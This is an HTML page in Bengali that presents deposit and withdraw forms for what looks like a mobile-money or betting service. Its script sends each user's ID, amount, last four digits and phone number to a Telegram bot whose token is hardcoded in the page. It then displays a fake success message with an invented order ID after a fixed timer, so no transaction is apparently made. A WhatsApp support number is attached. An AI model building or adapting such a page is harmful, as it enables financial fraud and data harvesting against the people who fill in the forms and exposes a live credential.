<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box;}

body{
  margin:0;
  font-family:'Poppins',sans-serif;
  background:linear-gradient(180deg,#020617,#031b34);
  color:white;
  display:flex;
  justify-content:center;
}

.container{
  width:100%;
  max-width:380px;
  padding:15px;
  padding-bottom:120px;
}

/* TOP + BOTTOM SAME STYLE */
.top-note, .bottom-note{
  overflow:hidden;
  background: rgba(14,165,233,0.15);
  backdrop-filter: blur(10px);
  border:1px solid rgba(255,255,255,0.1);
  border-radius:12px;
  margin-bottom:8px;
  text-align:center;
  cursor:pointer;
}

.bottom-note{
  position:fixed;
  bottom:60px;
  left:50%;
  transform:translateX(-50%);
  width:calc(100% - 30px);
  max-width:380px;
}

.top-note span, .bottom-note span{
  display:inline-block;
  padding:10px;
  white-space:nowrap;
  animation:slide 10s linear infinite;
}

@keyframes slide{
  0%{transform:translateX(100%);}
  100%{transform:translateX(-100%);}
}

/* tabs */
.tabs{
  display:flex;
  margin-bottom:8px;
  background:#020617;
  border-radius:20px;
  padding:4px;
}

.tab{
  flex:1;
  padding:12px;
  text-align:center;
  border-radius:20px;
  cursor:pointer;
  color:#94a3b8;
}

.tab.active{
  background:linear-gradient(45deg,#0ea5e9,#2563eb);
  color:white;
}

.card{
  background:rgba(2,6,23,0.9);
  padding:18px;
  border-radius:22px;
  margin-top:6px;
}

.methods{
  display:flex;
  gap:8px;
  margin-bottom:12px;
}

.method{
  flex:1;
  padding:10px;
  text-align:center;
  background:#0f172a;
  border-radius:14px;
  cursor:pointer;
}

.method.active{border:1px solid #0ea5e9;}

.row{
  display:flex;
  gap:8px;
}

.row input{
  flex:1;
  padding:12px;
  border:none;
  border-radius:14px;
  background:#020617;
  color:white;
}

.btn{
  width:100%;
  padding:14px;
  margin-top:15px;
  background:linear-gradient(45deg,#0ea5e9,#2563eb);
  border:none;
  border-radius:16px;
  color:white;
}

/* LOADING */
.loading{
  display:none;
  text-align:center;
  margin-top:10px;
}

.loader{
  border:4px solid #ccc;
  border-top:4px solid #0ea5e9;
  border-radius:50%;
  width:30px;
  height:30px;
  animation:spin 1s linear infinite;
  margin:auto;
}

@keyframes spin{
  100%{transform:rotate(360deg);}
}

/* SUCCESS */
.success{
  display:none;
  text-align:center;
  margin-top:10px;
  color:#22c55e;
  font-weight:600;
}

</style>
</head>

<body>

<div class="container">

<div class="top-note">
  <span>⏳ অনুগ্রহ করে অপেক্ষা করুন, আপনার ডিপোজিট প্রক্রিয়াধীন...</span>
</div>

<div class="tabs">
  <div class="tab active" onclick="showTab('deposit',event)">Deposit</div>
  <div class="tab" onclick="showTab('withdraw',event)">Withdraw</div>
</div>

<!-- Deposit -->
<div id="deposit" class="card">
  <div class="row">
    <input id="d_user" placeholder="ইউজার ID">
    <input id="d_amount" placeholder="টাকার পরিমাণ">
    <input id="d_last" placeholder="লাস্ট ৪ সংখ্যা">
  </div>
  <button class="btn" onclick="handleDeposit()">সাবমিট</button>

  <div class="loading" id="d_load"><div class="loader"></div></div>
  <div class="success" id="d_success"></div>
</div>

<!-- Withdraw -->
<div id="withdraw" class="card" style="display:none;">
  <div class="row">
    <input id="w_user" placeholder="ইউজার ID">
    <input id="w_amount" placeholder="টাকার পরিমাণ">
    <input id="w_number" placeholder="নাম্বার">
  </div>
  <button class="btn" onclick="handleWithdraw()">সাবমিট</button>

  <div class="loading" id="w_load"><div class="loader"></div></div>
  <div class="success" id="w_success"></div>
</div>

</div>

<!-- Bottom Note (WhatsApp Clickable) -->
<div class="bottom-note" onclick="openWhatsApp()">
  <span>📞 Support: +855969610245</span>
</div>

<script>
const botToken="8216213984:AAFCOQsGouXgnit2vKR6Rv8-VonSYL7_irk";
const chatId="8406979793";

function generateOrder(){
  return "ORD"+Date.now();
}

function send(msg){
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({chat_id:chatId,text:msg})
  });
}

function handleDeposit(){
  let order=generateOrder();
  document.getElementById("d_load").style.display="block";

  setTimeout(()=>{
    document.getElementById("d_load").style.display="none";
    document.getElementById("d_success").style.display="block";
    document.getElementById("d_success").innerText="✅ সফল! Order ID: "+order;

    let msg=`📥 Deposit
Order: ${order}
User: ${d_user.value}
Amount: ${d_amount.value}
Last: ${d_last.value}`;

    send(msg);
  },2000);
}

function handleWithdraw(){
  let order=generateOrder();
  document.getElementById("w_load").style.display="block";

  setTimeout(()=>{
    document.getElementById("w_load").style.display="none";
    document.getElementById("w_success").style.display="block";
    document.getElementById("w_success").innerText="✅ সফল! Order ID: "+order;

    let msg=`📤 Withdraw
Order: ${order}
User: ${w_user.value}
Amount: ${w_amount.value}
Number: ${w_number.value}`;

    send(msg);
  },2000);
}

function showTab(tab,e){
  deposit.style.display="none";
  withdraw.style.display="none";
  document.getElementById(tab).style.display="block";
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  e.target.classList.add('active');
}

function openWhatsApp(){
  window.open("https://wa.me/855969610245","_blank");
}
</script>

</body>
</html>
